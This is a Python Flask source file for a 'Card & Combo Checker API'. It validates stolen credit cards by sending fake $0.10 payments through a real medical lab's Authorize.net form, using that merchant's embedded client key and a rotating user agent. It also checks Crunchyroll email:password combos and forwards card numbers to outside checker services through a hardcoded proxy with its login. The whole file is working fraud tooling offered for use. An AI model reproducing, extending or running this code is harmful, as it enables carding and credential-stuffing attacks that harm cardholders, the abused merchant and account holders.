from flask import Flask, request, jsonify
import requests, random, string, uuid, json, os, time
from fake_useragent import UserAgent

app = Flask(__name__)

# ===========================
# 🏠 HOME ROUTE
# ===========================
@app.route("/")
def home():
    return jsonify({
        "api_name": "Card & Combo Checker API",
        "developer": "💻 Made by Sukhraj",
        "version": "1.0.0",
        "description": (
            "A simple API to check credit cards, Crunchyroll accounts "
            "and verify Crunchyroll combos. Supports GET and POST methods."
        ),
        "endpoints": {
            "/api/v1/checker/cc/stripe": {
                "method": ["POST", "GET"],
                "params": {"cc": "Card details or number (required)"},
                "example": {
                    "GET": "/api/v1/checker/cc/stripe?cc=5154620000000000|12|25|123",
                    "POST": {"cc": "5154620000000000|12|25|123"}
                }
            },
            "/api/v1/checker/cc/authnet": {
                "method": ["POST", "GET"],
                "params": {"cc": "Card format: number|month|year|cvv"},
                "example": {
                    "GET": "/api/v1/checker/cc/authnet?cc=5154620000000000|12|25|123"
                }
            },
            "/api/v1/checker/crunchyroll": {
                "method": ["POST", "GET"],
                "params": {"combo": "Email:Password pair (required)"},
                "example": {
                    "GET": "/api/v1/checker/crunchyroll?combo=test@gmail.com:12345",
                    "POST": {"combo": "test@gmail.com:12345"}
                }
            }
        },
        "status": "✅ API is live and ready to use",
        "note": "Use POST for secure/bulk checks."
    }), 200

# ===========================
# 💳 BIN / CARD CHECKER
# ===========================
@app.route("/api/v1/checker/cc/stripe", methods=["POST", "GET"])
def checker_cc():
    if request.method == "POST":
        data = request.get_json()
        cc = data.get("cc") if data else None
    else:
        cc = request.args.get("cc")

    if not cc:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    url = (
        "https://rockyysoon-fb0f.onrender.com/index.php"
        "?site=https://keyadream.com/"
        f"&cc={cc}"
        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
    )

    response = requests.get(url)
    try:
        return jsonify(response.json()), 200
    except:
        return jsonify({"result": response.text}), 200


# ===========================
# 🍿 CRUNCHYROLL COMBO CHECKER
# ===========================
@app.route("/api/v1/checker/crunchyroll", methods=["POST", "GET"])
def checker_crunchy():
    if request.method == "POST":
        data = request.get_json()
        combo = data.get("combo") if data else None
    else:
        combo = request.args.get("combo")

    if not combo:
        return jsonify({"error": "Missing 'combo' parameter"}), 400

    url = f"https://crunchy-ng.vercel.app/check?combo={combo}"
    response = requests.get(url)

    try:
        return jsonify(response.json()), 200
    except:
        return jsonify({"result": response.text}), 200


# ===========================
# 💰 AUTH.NET TOKEN & PAYMENT CHECKER
# ===========================
def random_string(length):
    return ''.join(random.choices(string.ascii_letters, k=length))

def random_email():
    return f"{random_string(7).lower()}@gmail.com"

def mask_card(card):
    return card[:6] + "*" * (len(card) - 10) + card[-4:] if len(card) >= 10 else "*" * len(card)

# rotate user-agent
try:
    ua = UserAgent()
    USER_AGENT = ua.random
except:
    USER_AGENT = "Mozilla/5.0 (compatible; API/1.0)"
print("[✓] Using User-Agent:", USER_AGENT)

# load merchant credentials
AUTHNET_NAME = os.getenv("AUTHNET_NAME", "3c5Q9QdJW")
AUTHNET_CLIENTKEY = os.getenv("AUTHNET_CLIENTKEY", "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu")

def generate_token(card_number, expiration_date, cvv):
    url = "https://api2.authorize.net/xml/v1/request.api"
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {"name": AUTHNET_NAME, "clientKey": AUTHNET_CLIENTKEY},
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": expiration_date,
                    "cardCode": cvv
                }
            }
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": USER_AGENT
    }

    try:
        r = requests.post(url, headers=headers, json=payload, timeout=15)
        res = json.loads(r.text.lstrip("\ufeff").strip())
        if 'opaqueData' in res and 'dataValue' in res['opaqueData']:
            return {"ok": True, "token": res['opaqueData']['dataValue'], "raw": res}
        return {"ok": False, "error": "No token in response", "raw": res}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def submit_payment_form(opaque_token, expire_for_form="10/29"):
    url = "https://avanticmedicallab.com/wp-admin/admin-ajax.php"
    fname, lname, email = random_string(6), random_string(6), random_email()

    payload = {
        "wpforms[fields][1][first]": fname,
        "wpforms[fields][1][last]": lname,
        "wpforms[fields][17]": "0.10",
        "wpforms[fields][2]": email,
        "wpforms[fields][3]": "(219) 767-6687",
        "wpforms[fields][4][address1]": "New York",
        "wpforms[fields][4][city]": "New York",
        "wpforms[fields][4][state]": "NY",
        "wpforms[fields][4][postal]": "10080",
        "wpforms[fields][6]": "$ 0.10",
        "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
        "wpforms[authorize_net][opaque_data][value]": opaque_token,
        "wpforms[authorize_net][card_data][expire]": expire_for_form,
        "action": "wpforms_submit",
        "page_url": "https://avanticmedicallab.com/pay-bill-online/",
        "page_title": "Pay Bill Online",
        "page_id": "3388"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/pay-bill-online/",
        "User-Agent": USER_AGENT,
    }

    try:
        r = requests.post(url, data=payload, headers=headers)
        try:
            return r.json()
        except:
            return {"raw": r.text[:300]}
    except Exception as e:
        return {"error": str(e)}


@app.route("/api/v1/checker/cc/authnet", methods=["GET", "POST"])
def checker_authnet():
    # read input
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        cc_input = data.get("cc") or request.args.get("cc")
    else:
        cc_input = request.args.get("cc")

    if not cc_input:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    parts = cc_input.split("|")
    if len(parts) < 4:
        return jsonify({"error": "Invalid format. Use: number|month|year|cvv"}), 400

    card, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
    expiry_token = f"{month}{year[-2:]}" if len(year) >= 2 else f"{month}{year}"
    expiry_form = f"{month}/{year[-2:]}"

    # generate token
    token_res = generate_token(card, expiry_token, cvv)
    if not token_res.get("ok"):
        return jsonify({"status": "failed", "error": token_res.get("error"), "raw": token_res.get("raw")}), 200

    opaque = token_res["token"]
    submit_res = submit_payment_form(opaque, expire_for_form=expiry_form)

    return jsonify({
        "status": "ok",
        "card_masked": mask_card(card),
        "expiry": expiry_form,
        "token_masked": opaque[:6] + "..." if opaque else None,
        "payment_response": submit_res
    }), 200


# ===========================
# 🚀 RUN APP
# ===========================
if __name__ == "__main__":
    app.run(debug=True)
